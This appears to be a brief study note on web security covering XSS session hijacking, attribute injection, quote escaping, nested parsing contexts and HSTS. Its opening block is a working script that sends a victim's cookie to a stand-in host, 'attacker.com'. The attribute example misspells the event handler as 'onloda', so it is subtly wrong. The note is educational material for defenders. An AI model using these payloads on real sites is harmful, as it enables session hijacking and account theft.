# session hijacking with xss

```
<script type="text/javascript">
	new Image().src =
		'https://attacker.com/steal?cookie=' + document.cookie
</script>
```
# Dangerous HTML attributes

```
<img src='x.png' alt = 'DATA' />
```
- if you put *DATA= example' onloda='alert(document.cookie)*
this is result

```
<img src='x.png' alt = 'example' onloda='alert(document.cookie)' />
```
- how to fix???
- change *'* and *"* to &apos;, &quot;

# Beware nesting and parsing chain

- ex1

```
<div onclick="setTimeout('doStuff(¥'USER_DATA_HERE¥')', 1000)"></div>

<script>
	let someValue = 'USER_DATA_HERE'
	setTimeout("doStuff('" + someValue + "')", 1000)
</script>
```

# What is HSTS ?
Hypertext Strict Transport Security is forced to use TLS policy mechanism
